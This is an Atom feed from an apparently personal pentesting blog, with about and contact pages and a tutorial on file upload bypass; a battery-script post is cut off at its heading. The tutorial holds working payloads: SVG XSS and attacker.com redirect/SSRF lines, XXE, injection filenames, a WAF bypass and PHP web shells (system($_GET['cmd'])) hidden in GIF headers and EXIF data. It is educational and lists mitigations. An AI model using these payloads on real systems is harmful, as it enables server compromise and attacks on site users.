<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/">
    <title>Offens!ve Blogs - Sakibul Ali Khan</title>
    <link href="https://sakibulalikhan.pages.dev/feed.xml" rel="self" />
    <link href="https://sakibulalikhan.pages.dev" />
    <updated>2024-11-28T19:29:47+06:00</updated>
    <author>
        <name>Sakibul Ali Khan</name>
    </author>
    <id>https://sakibulalikhan.pages.dev</id>

    <entry>
        <title>Contact</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/contact.html"/>
        <id>https://sakibulalikhan.pages.dev/contact.html</id>

        <updated>2024-08-18T02:20:20+06:00</updated>
            <summary></summary>
        <content type="html">
            <![CDATA[
                <article class="post"><header class="post__header">
<p> </p>
</header>
<div class="post__inner">
<div class="post__entry"><form id="captcha-form" action="https://formsubmit.co/383c488b21165b2620d72df1c55cb982" method="post">
<div style="margin-bottom: 1.25rem; display: flex;">
<div style="flex: 1;"><label for="first_name">First Name:</label> <input id="first_name" style="width: 100%;" maxlength="50" name="first_name" required="" type="text"></div>
<div style="flex: 1; margin-left: 1rem;"><label for="last_name">Last Name:</label> <input id="last_name" style="width: 100%;" maxlength="50" name="last_name" required="" type="text"></div>
</div>
<div style="margin-bottom: 1.25rem;"><label for="email_addr">Email address:</label> <input id="email_addr" style="width: 100%;" maxlength="50" name="email" required="" type="email"></div>
<div style="margin-bottom: 1.25rem;"><label for="message">Message:</label> <textarea id="message" style="width: 100%;" name="message" rows="5"></textarea></div>
<div style="margin-bottom: 1.25rem;"><label id="captcha-question">Please solve: 6 + 8 =</label> <input id="captcha" style="width: 20%;" maxlength="2" required="" type="number" data-answer="14"></div>
<input name="_captcha" type="hidden" value="false"> <input name="_subject" type="hidden" value="Mail From Offensive Blog!"> <input name="_next" type="hidden" value="https://sakibulalikhan.pages.dev/thank-you"> <button style="color: white; padding: 0.75rem 2rem; border: none; border-radius: 5px; cursor: pointer;" type="submit">Send</button></form>
<p>
<script>document.getElementById("captcha-form").onsubmit = function() {
		return validateCaptcha();
	}

	function generateCaptcha() {
		const num1 = Math.floor(Math.random() * 10);
		const num2 = Math.floor(Math.random() * 10);
		const operator = Math.random() < 0.5 ? '+' : '-';

		document.getElementById('captcha-question').textContent = `Please solve: ${num1} ${operator} ${num2} =`;
		document.getElementById('captcha').setAttribute('data-answer', operator === '+' ? num1 + num2 : num1 - num2);
	}

	function validateCaptcha() {
		const userAnswer = parseInt(document.getElementById('captcha').value);
		const correctAnswer = parseInt(document.getElementById('captcha').getAttribute('data-answer'));

		if (userAnswer !== correctAnswer) {
			alert('Captcha is incorrect. Please try again.');
			return false;
		}

		return true;
	}

	generateCaptcha();</script>
</p>
</div>
</div>
</article>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Thank You</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/thank-you.html"/>
        <id>https://sakibulalikhan.pages.dev/thank-you.html</id>

        <updated>2024-08-18T02:17:24+06:00</updated>
            <summary>
                <![CDATA[
                    Thanks For Your Message... I appreciate you reaching out to me. Your message has been received. Home
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <div class="container align-center">
<p class="align-left"><code>Thanks For Your Message...</code></p>
<p class="text-center msg msg--highlight  msg--success">I appreciate you reaching out to me. Your message has been received.</p>
<p><a href="https://sakibulalikhan.pages.dev/" class="btn btn--outline">Home</a></p>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>About Me</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/about.html"/>
        <id>https://sakibulalikhan.pages.dev/about.html</id>

        <updated>2024-08-18T02:07:04+06:00</updated>
            <summary>
                <![CDATA[
                    Greetings! I'm a penetration tester and security enthusiast who has always been curious to learn hacking at an early age. I love to share my&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                <figure class="post__image post__image--center"><img decoding="async" loading="lazy"  src="file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/my-about-img-md.png" alt="Sakibul Ali Khan" width="170" height="199" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/responsive/my-about-img-md-xs.png 300w ,file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/responsive/my-about-img-md-sm.png 480w ,file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/responsive/my-about-img-md-md.png 768w ,file:///C:/Users/sak/Documents/Publii/sites/offensve-blogs-sakibul-ali-khan/input/media/posts/32/responsive/my-about-img-md-lg.png 1024w"></figure>
<p><em>Greetings! I'm a penetration tester and security enthusiast who has always been curious to learn hacking at an early age. I love to share my knowledge with others, and this helps me to solidify my concepts. I created this blog to share my knowledge with beginners and enthusiasts so they can learn what I know, as it's a great thing. I have learned from the community, and this is the least I can do to help others. I'm planning to give a lot more to the community in the future.</em></p>
<p><strong>Skills:</strong></p>
<ul>
<li>Penetration Testing.</li>
<li>Vulnerability Assessment.</li>
<li>Linux System Administration.</li>
<li>Capture The Flag.</li>
</ul>
<p><strong>Interests:</strong></p>
<ul>
<li>DevSecOps.</li>
<li>Cloud Pentesting.</li>
<li>Red Teaming.</li>
</ul>
<p><strong>About me:</strong> </p>
<p>I'm Sakibul Ali Khan, an Independent Security Researcher and <a href="https://yogosha.com/hackers/" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">Yogosha Strike Force (YSF)</a> member, who is deeply dedicated to Red Teaming. With experience in national and international Capture The Flag (CTF) competitions, I've been a finalist in major national CTFs, providing me with valuable insights into the world of cybersecurity.<br><br>My academic journey centers around Computer Science, where I'm acquiring Python, C, and Bash programming skills. I enjoy hands-on learning, having tackled various challenges on platforms like TryHackMe, HackTheBox, and CTFtime. Proficient in Linux and familiar with tools such as Metasploit, Burpsuite, and Nmap, I navigate the cyber world with confidence.</p>
<p><strong>Connect with me:</strong></p>
<ul>
<li>Twitter: <a href="https://twitter.com/sakibulalikhan" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">@sakibulalikhan</a></li>
<li>LinkedIn: <a href="https://www.linkedin.com/in/sakibulalikhan/" target="null" class="extlink extlink-icon-5 "  title="sakibulalikhan" >Sakibul Ali Khan</a></li>
<li>Github: <a href="https://github.com/sakibulalikhan" target="null" class="extlink extlink-icon-5 "  title="sakibulalikhan" >sakibulalikhan</a></li>
<li>Medium: <a href="https://sakibulalikhan.medium.com/" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">@sakibulalikhan</a></li>
</ul>
<p> </p>
<p>
<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="sakibulalikhan" data-color="#d67729" data-emoji="" data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#FFDD00"></script>
</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>File Upload Bypass: Understanding and Mitigating Risks in Web Applications</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/file-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html"/>
        <id>https://sakibulalikhan.pages.dev/file-upload-bypass-understanding-and-mitigating-risks-in-web-applications.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/31/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3-md.png" medium="image" />
            <category term="Web Security"/>
            <category term="Pentesting"/>
            <category term="OWASP 10"/>

        <updated>2024-08-10T05:14:50+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/31/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3-md.png" alt="File Upload Bypass: Understanding and Mitigating Risks in Web Applications" />
                    Introduction File upload vulnerabilities are a significant concern in the realm of web application security. When a web application allows users to upload files without&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/31/File-Upload-Bypass-Understanding-and-Mitigating-Risks-in-Web-Applications-3-md.png" class="type:primaryImage" alt="File Upload Bypass: Understanding and Mitigating Risks in Web Applications" /></p>
                <h2 class="code-line" data-line-start="2" data-line-end="3">Introduction</h2>
<p class="has-line-data" data-line-start="4" data-line-end="5">File upload vulnerabilities are a significant concern in the realm of web application security. When a web application allows users to upload files without proper validation and security measures, it opens the door for attackers to upload malicious files that can be executed on the server. This can lead to various attacks, including the deployment of phishing pages, data exfiltration, and server compromise.</p>
<p class="has-line-data" data-line-start="6" data-line-end="7">Despite the inherent risks, file uploads are a common requirement in modern web applications. However, many developers and security professionals underestimate the potential dangers associated with insecure file upload mechanisms. This blog post aims to shed light on the various risks associated with file uploads, the types of attacks that can be executed, and the best practices for securing file upload functionalities.</p>
<h2 class="code-line" data-line-start="8" data-line-end="9"><a id="Risks_of_Exploiting_File_Upload_Vulnerabilities_8"></a>Risks of Exploiting File Upload Vulnerabilities</h2>
<p class="has-line-data" data-line-start="10" data-line-end="11">Exploiting file upload vulnerabilities can lead to a variety of malicious outcomes, including but not limited to:</p>
<ul>
<li class="has-line-data" data-line-start="12" data-line-end="13"><strong>Remote Code Execution (RCE)</strong></li>
<li class="has-line-data" data-line-start="13" data-line-end="14"><strong>Server-Side Request Forgery (SSRF)</strong></li>
<li class="has-line-data" data-line-start="14" data-line-end="15"><strong>Cross-Site Scripting (XSS)</strong></li>
<li class="has-line-data" data-line-start="15" data-line-end="16"><strong>Local File Inclusion (LFI)</strong></li>
<li class="has-line-data" data-line-start="16" data-line-end="17"><strong>XML External Entity (XXE) attacks</strong></li>
<li class="has-line-data" data-line-start="17" data-line-end="18"><strong>Phishing attacks</strong></li>
<li class="has-line-data" data-line-start="18" data-line-end="19"><strong>Parameter pollution</strong></li>
<li class="has-line-data" data-line-start="19" data-line-end="20"><strong>SQL Injection</strong></li>
<li class="has-line-data" data-line-start="20" data-line-end="21"><strong>Denial of Service (DoS) attacks</strong></li>
<li class="has-line-data" data-line-start="21" data-line-end="23"><strong>And many more…</strong></li>
</ul>
<h2 class="code-line" data-line-start="23" data-line-end="24"><a id="File_Extensions_and_Their_Impacts_23"></a>File Extensions and Their Impacts</h2>
<p class="has-line-data" data-line-start="25" data-line-end="26">Certain file extensions can lead to specific vulnerabilities if uploaded successfully. Here’s a breakdown of some common extensions and their potential impacts:</p>
<table class="table table-striped table-bordered">
<thead>
<tr>
<th><strong>Extension</strong></th>
<th><strong>Impact</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ASP, ASPX, PHP5, PHP, PHP3</td>
<td>Webshell, RCE</td>
</tr>
<tr>
<td>SVG</td>
<td>Stored XSS, SSRF, XXE</td>
</tr>
<tr>
<td>GIF</td>
<td>Stored XSS, SSRF</td>
</tr>
<tr>
<td>CSV</td>
<td>CSV Injection</td>
</tr>
<tr>
<td>XML</td>
<td>XXE</td>
</tr>
<tr>
<td>AVI</td>
<td>LFI, SSRF</td>
</tr>
<tr>
<td>HTML, JS</td>
<td>HTML Injection, XSS, Open Redirect</td>
</tr>
<tr>
<td>PNG, JPEG</td>
<td>Pixel Flood Attack (DoS)</td>
</tr>
<tr>
<td>ZIP</td>
<td>RCE via LFI, DoS</td>
</tr>
<tr>
<td>PDF, PPTX</td>
<td>SSRF, Blind XXE</td>
</tr>
<tr>
<td>SCF</td>
<td>RCE</td>
</tr>
</tbody>
</table>
<h2 class="code-line" data-line-start="41" data-line-end="42"><a id="Exploitation_Techniques_41"></a>Exploitation Techniques</h2>
<h3 class="code-line" data-line-start="43" data-line-end="44"><a id="CrossSite_Scripting_XSS_43"></a>Cross-Site Scripting (XSS)</h3>
<p class="has-line-data" data-line-start="45" data-line-end="46">XSS can be achieved through various methods when file uploads are not properly validated. Here are some examples:</p>
<ol>
<li class="has-line-data" data-line-start="47" data-line-end="50">
<p class="has-line-data" data-line-start="47" data-line-end="48"><strong>Manipulating File Names</strong>:</p>
<ul>
<li class="has-line-data" data-line-start="48" data-line-end="50">Set the filename to <code>filename="svg onload=alert(document.domain)&gt;"</code> or <code>filename="58832_300x300.jpg&lt;svg onload=confirm()"&gt;</code>.</li>
</ul>
</li>
<li class="has-line-data" data-line-start="50" data-line-end="53">
<p class="has-line-data" data-line-start="50" data-line-end="51"><strong>Using GIF Files</strong>:</p>
<ul>
<li class="has-line-data" data-line-start="51" data-line-end="53">Upload a GIF file with the content: <code>GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;</code>.</li>
</ul>
</li>
<li class="has-line-data" data-line-start="53" data-line-end="65">
<p data-line-start="53" data-line-end="54"><strong>Using SVG Files</strong>:</p>
<pre class="language-html line-numbers"><code>&lt;?xml version="1.0" standalone="no"?&gt;
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
   &lt;rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /&gt;
   &lt;script type="text/javascript"&gt;
      alert("HolyBugx XSS");
   &lt;/script&gt;
&lt;/svg&gt;</code></pre>
</li>
</ol>
<h3 class="code-line" data-line-start="65" data-line-end="66"><a id="Open_Redirection_65"></a>Open Redirection</h3>
<p class="has-line-data" data-line-start="67" data-line-end="68">Open redirection can also be exploited through SVG files:</p>
<pre class="language-html line-numbers"><code>&lt;svg xmlns="http://www.w3.org/2000/svg" onload="window.location='https://attacker.com'"&gt;
   &lt;rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /&gt;
&lt;/svg&gt;</code></pre>
<h3 class="code-line" data-line-start="74" data-line-end="75"><a id="XML_External_Entity_XXE_74"></a>XML External Entity (XXE)</h3>
<p class="has-line-data" data-line-start="76" data-line-end="77">XXE attacks can be executed by uploading specially crafted SVG files:</p>
<pre class="language-html line-numbers"><code>&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"&gt;
    &lt;image xlink:href="expect://ls"&gt;&lt;/image&gt;
&lt;/svg&gt;</code></pre>
<h3 class="code-line" data-line-start="83" data-line-end="84"><a id="ServerSide_Request_Forgery_SSRF_83"></a>Server-Side Request Forgery (SSRF)</h3>
<ol>
<li class="has-line-data" data-line-start="85" data-line-end="87">
<p class="has-line-data" data-line-start="85" data-line-end="86"><strong>Abusing “Upload from URL”</strong>: If the application allows uploading from a URL, an attacker could specify a URL from a service like <a href="https://iplogger.org/invisible/"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >IPlogger</a> to steal information from visitors.</p>
</li>
<li class="has-line-data" data-line-start="87" data-line-end="95">
<p class="has-line-data" data-line-start="87" data-line-end="88"><strong>Using SVG Files</strong>:</p>
<pre class="language-html line-numbers"><code>&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"&gt;
   &lt;image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /&gt;
&lt;/svg&gt;</code></pre>
</li>
</ol>
<h3 class="code-line" data-line-start="95" data-line-end="96"><a id="Command_Injection_95"></a>Command Injection</h3>
<p data-line-start="97" data-line-end="98">Command injection can be attempted by setting the filename:</p>
<pre class="language-bash line-numbers"><code>filename ; sleep 10;</code></pre>
<h3 class="code-line" data-line-start="102" data-line-end="103"><a id="Local_File_Inclusion_LFI_102"></a>Local File Inclusion (LFI)</h3>
<p data-line-start="104" data-line-end="105">LFI can be exploited by manipulating the filename:</p>
<pre class="language-bash line-numbers"><code>filename ../../etc/passwd/logo.png
filename ../../../logo.png</code></pre>
<h3 class="code-line" data-line-start="110" data-line-end="111"><a id="SQL_Injection_110"></a>SQL Injection</h3>
<p data-line-start="112" data-line-end="113">SQL injection can be attempted by setting the filename:</p>
<pre class="language-sql line-numbers"><code>filename 'sleep(10).jpg
filename sleep(10)-- -.jpg</code></pre>
<h3 class="code-line" data-line-start="118" data-line-end="119"><a id="Denial_of_Service_DoS_118"></a>Denial of Service (DoS)</h3>
<ol>
<li class="has-line-data" data-line-start="120" data-line-end="122">
<p class="has-line-data" data-line-start="120" data-line-end="121"><strong>Pixel Flood Attack</strong>: Upload a malicious image that causes a DoS, such as the one found <a href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/malicious-images/lottapixel.jpg"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >here</a>.</p>
</li>
<li class="has-line-data" data-line-start="122" data-line-end="124">
<p class="has-line-data" data-line-start="122" data-line-end="123"><strong>Large Filename Values</strong>: Use a filename with excessive characters, e.g., <code>name: 1234...99.png</code>.</p>
</li>
</ol>
<h3 class="code-line" data-line-start="124" data-line-end="125"><a id="ServerSide_Template_Injection_SSTI_124"></a>Server-Side Template Injection (SSTI)</h3>
<p class="has-line-data" data-line-start="126" data-line-end="127">SSTI can also be a risk if the application processes uploaded files in a way that allows template injection.</p>
<h2 class="code-line" data-line-start="128" data-line-end="129"><a id="Tools_and_Payloads_128"></a>Tools and Payloads</h2>
<p class="has-line-data" data-line-start="130" data-line-end="131">To assist in testing and exploiting file upload vulnerabilities, several tools and payloads are available:</p>
<ul>
<li class="has-line-data" data-line-start="132" data-line-end="133"><strong><a href="https://github.com/barrracud4/image-upload-exploits"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >barrracud4/image-upload-exploits</a></strong></li>
<li class="has-line-data" data-line-start="133" data-line-end="134"><strong><a href="https://github.com/almandin/fuxploider"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >almandin/fuxploider</a></strong></li>
<li class="has-line-data" data-line-start="134" data-line-end="136"><strong><a href="https://github.com/PortSwigger/upload-scanner"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >PortSwigger/upload-scanner</a></strong></li>
</ul>
<h2 class="code-line" data-line-start="171" data-line-end="172"><a id="WAF_Bypass_Tips_by_0xInfection_173"></a>WAF Bypass Tips</h2>
<ul>
<li class="has-line-data" data-line-start="174" data-line-end="179"><strong>Case: File Upload (.php blocked)</strong>
<ul>
<li class="has-line-data" data-line-start="175" data-line-end="176"><code>/file=xx.php</code> &lt;- Blocked</li>
<li class="has-line-data" data-line-start="176" data-line-end="177"><code>/file===xx.php</code> &lt;- Bypassed</li>
<li class="has-line-data" data-line-start="177" data-line-end="179">The file got uploaded successfully.</li>
</ul>
</li>
</ul>
<h3 class="code-line" data-line-start="179" data-line-end="180"><a id="Bypass_File_Upload_Filtering_179"></a>Bypass File Upload Filtering</h3>
<h5><strong><span style="color: #e67e23;">-</span> File Renaming Technique:</strong></h5>
<p class="has-line-data" data-line-start="6" data-line-end="7">To bypass file upload restrictions, we can rename our shell script and upload it as <code>shell.php.jpg</code>. This method allows the file to pass through filters and be executed as PHP.</p>
<h5><strong><span style="color: #e67e23;">-</span> File Extensions to Consider:</strong></h5>
<ul style="list-style-type: circle;">
<li class="has-line-data" data-line-start="10" data-line-end="11"><strong>PHP</strong>: .php, .phtml, .php3, .php4, .php5, .inc</li>
<li class="has-line-data" data-line-start="11" data-line-end="12"><strong>ASP</strong>: .asp, .aspx</li>
<li class="has-line-data" data-line-start="12" data-line-end="13"><strong>Perl</strong>: .pl, .pm, .cgi, .lib</li>
<li class="has-line-data" data-line-start="13" data-line-end="14"><strong>JSP</strong>: .jsp, .jspx, .jsw, .jsv, .jspf</li>
<li class="has-line-data" data-line-start="14" data-line-end="16"><strong>ColdFusion</strong>: .cfm, .cfml, .cfc, .dbm</li>
</ul>
<h5><strong><span style="color: #e67e23;">-</span> Content Manipulation:</strong></h5>
<p class="has-line-data" data-line-start="18" data-line-end="19">If the upload process checks the file content, you can prepend the text <code>GIF89a;</code> to your shell code. The modified code would look like this:</p>
<pre class="language-bash line-numbers"><code>GIF89a;
&lt;?
system($_GET['cmd']); // Alternatively, you can insert your complete shell code here
?&gt;</code></pre>
<h5><strong><span style="color: #e67e23;">-</span> Embedding in an Image:</strong></h5>
<p class="has-line-data" data-line-start="29" data-line-end="30">You can use ExifTool to manipulate the EXIF data of an image. For example, you can add a comment with your PHP code like this:</p>
<pre class="language-bash line-numbers"><code>exiftool -Comment='&lt;?php echo "&lt;pre&gt;"; system($_GET['cmd']); ?&gt;' lo.jpg</code></pre>
<p class="has-line-data" data-line-start="35" data-line-end="36">ExifTool is a powerful utility for viewing and editing EXIF data. After modifying the image, remember to rename the file:</p>
<pre class="language-bash line-numbers"><code>mv lo.jpg lo.php.jpg</code></pre>
<h5><strong><span style="color: #e67e23;">-</span> Using exiftool</strong>:</h5>
<pre class="language-bash line-numbers"><code>exiftool -Comment='&lt;?php echo "&lt;pre&gt;"; system($_GET['cmd']); ?&gt;' shell.jpg 
mv shell.jpg shell.php.jpg</code></pre>
<h3 style="margin-top: 2.28571rem; font-family: var(--font-base); font-weight: var(--font-weight-bold); letter-spacing: var(--letter-spacing); font-size: 1.42383em;" data-line-start="179" data-line-end="180"><img decoding="async" loading="lazy" style="outline: 3px solid rgba(var(--color-primary-rgb), 0.55) !important;" src="https://kathan19.gitbook.io/~gitbook/image?url=https%3A%2F%2Fuser-images.githubusercontent.com%2F33719912%2F193826710-b6d71979-04f4-42a6-a9c6-7d14784de9d4.png&amp;width=768&amp;dpr=4&amp;quality=100&amp;sign=48bec4ba&amp;sv=1" data-is-external-image="true"></h3>
<h2 class="code-line" data-line-start="136" data-line-end="137"><a id="Mitigation_Strategies_136"></a>Mitigation Strategies</h2>
<p class="has-line-data" data-line-start="138" data-line-end="139">Implementing secure file upload functionality is not straightforward, but several best practices can help mitigate risks:</p>
<ol>
<li class="has-line-data" data-line-start="140" data-line-end="142">
<p class="has-line-data" data-line-start="140" data-line-end="141"><strong>Use Server-Generated Filenames</strong>: When storing uploaded files on disk, generate filenames on the server to avoid predictable paths.</p>
</li>
<li class="has-line-data" data-line-start="142" data-line-end="144">
<p class="has-line-data" data-line-start="142" data-line-end="143"><strong>Content Inspection</strong>: Inspect the content of uploaded files and enforce a whitelist of accepted, non-executable content types. Additionally, maintain a blacklist of common executable formats to hinder hybrid file attacks.</p>
</li>
<li class="has-line-data" data-line-start="144" data-line-end="146">
<p class="has-line-data" data-line-start="144" data-line-end="145"><strong>File Extension Whitelisting</strong>: Enforce a whitelist of accepted, non-executable file extensions.</p>
</li>
<li class="has-line-data" data-line-start="146" data-line-end="148">
<p class="has-line-data" data-line-start="146" data-line-end="147"><strong>Accurate Content-Type Headers</strong>: If uploaded files are downloadable, supply accurate non-generic Content-Type headers, the <code>X-Content-Type-Options: nosniff</code> header, and a <code>Content-Disposition</code> header that specifies that browsers should handle the file as an attachment.</p>
</li>
<li class="has-line-data" data-line-start="148" data-line-end="150">
<p class="has-line-data" data-line-start="148" data-line-end="149"><strong>File Size Limits</strong>: Enforce a size limit on uploaded files. This can be implemented both within application code and in the web server’s configuration for defense-in-depth.</p>
</li>
<li class="has-line-data" data-line-start="150" data-line-end="152">
<p class="has-line-data" data-line-start="150" data-line-end="151"><strong>Reject Archive Formats</strong>: Disallow uploads of archive formats such as ZIP, which can be used to bypass file type restrictions.</p>
</li>
</ol>
<h2 class="code-line" data-line-start="152" data-line-end="153"><a id="References_152"></a>References</h2>
<p class="has-line-data" data-line-start="154" data-line-end="155">For further reading and resources, check out the following references:</p>
<ul>
<li class="has-line-data" data-line-start="156" data-line-end="157"><a href="https://akash-venky091.medium.com/interesting-test-cases-of-file-uploading-vulnerabilities-3ad47f9e6149"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Interesting Test Cases of File Uploading Vulnerabilities</a></li>
<li class="has-line-data" data-line-start="157" data-line-end="158"><a href="https://www.onsecurity.io/blog/file-upload-checklist"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >File Upload Tricks and Checklist</a></li>
<li class="has-line-data" data-line-start="158" data-line-end="159"><a href="https://blog.yeswehack.com/yeswerhackers/exploitation/file-upload-attacks-part-1/"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >File Upload Attacks (Part 1) - Global Bug Bounty Platform</a></li>
<li class="has-line-data" data-line-start="159" data-line-end="160"><a href="https://medium.com/@nyomanpradipta120/unrestricted-file-upload-in-php-b4459eef9698"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Unrestricted File Upload in PHP</a></li>
<li class="has-line-data" data-line-start="160" data-line-end="161"><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >File Upload - OWASP Cheat Sheet Series</a></li>
<li class="has-line-data" data-line-start="161" data-line-end="162"><a href="https://www.hackingarticles.in/comprehensive-guide-on-unrestricted-file-upload/"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Comprehensive Guide on Unrestricted File Upload</a></li>
<li class="has-line-data" data-line-start="162" data-line-end="163"><a href="https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >HolyBugx/HolyTips</a></li>
<li class="has-line-data" data-line-start="163" data-line-end="164"><a href="https://infosecwriteups.com/web-application-analysis-exploiting-file-upload-vulnerabilities-cf48f79d51e"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Exploiting File Upload Vulnerabilities in Web Applications</a></li>
<li class="has-line-data" data-line-start="164" data-line-end="165"><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Unrestricted File Upload</a></li>
<li class="has-line-data" data-line-start="165" data-line-end="166"><a href="https://bugdisclose.medium.com/art-of-unrestricted-file-upload-exploitation-92ed28796d0"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Art of Unrestricted File Upload Exploitation</a></li>
<li class="has-line-data" data-line-start="166" data-line-end="167"><a href="https://book.hacktricks.xyz/pentesting-web/file-upload"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >File Upload</a></li>
<li class="has-line-data" data-line-start="167" data-line-end="168"><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Encoding Web Shells in PNG IDAT Chunks</a></li>
<li class="has-line-data" data-line-start="168" data-line-end="169"><a href="https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Uploading Backdoor For Fun And Profit. (RCE + DB-cred = P1)</a></li>
<li class="has-line-data" data-line-start="169" data-line-end="171"><a href="https://secnhack.in/unrestricted-file-uploading-vulnerability/"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >Unrestricted File Uploading Vulnerability - Secnhack</a></li>
</ul>
<h2 class="code-line" data-line-start="187" data-line-end="188"><a id="Conclusion_187"></a>Conclusion</h2>
<p class="has-line-data" data-line-start="189" data-line-end="190">File upload vulnerabilities pose a significant risk to web applications, and understanding how to exploit and mitigate these vulnerabilities is crucial for developers and security professionals alike. By implementing robust validation techniques and conducting thorough testing, organizations can significantly reduce the risk of file upload-related attacks.</p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Optimize Battery Health: How to Set Charge Thresholds for ASUS Laptops on Linux Made Easy</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/optimize-battery-health-how-to-set-charge-thresholds-for-asus-laptops-on-linux-made-easy.html"/>
        <id>https://sakibulalikhan.pages.dev/optimize-battery-health-how-to-set-charge-thresholds-for-asus-laptops-on-linux-made-easy.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/30/Optimize-Battery-Health-How-to-Set-Charge-Thresholds-for-ASUS-Laptops-on-Linux-Made-Easy.png" medium="image" />
            <category term="Linux"/>
            <category term="Bash Script"/>

        <updated>2024-06-07T12:44:24+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/30/Optimize-Battery-Health-How-to-Set-Charge-Thresholds-for-ASUS-Laptops-on-Linux-Made-Easy.png" alt="Optimize Battery Health: How to Set Charge Thresholds for ASUS Laptops on Linux Made Easy" />
                    Asus Battery Health Charging Script for Linux Author: @sakibulalikhan Asus laptops come with a built-in feature called Asus Battery Health Charging, which is often part&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/30/Optimize-Battery-Health-How-to-Set-Charge-Thresholds-for-ASUS-Laptops-on-Linux-Made-Easy.png" class="type:primaryImage" alt="Optimize Battery Health: How to Set Charge Thresholds for ASUS Laptops on Linux Made Easy" /></p>
                <h1 id="asus-battery-health-charging-script-for-linux">Asus Battery Health Charging Script for Linux</h1>
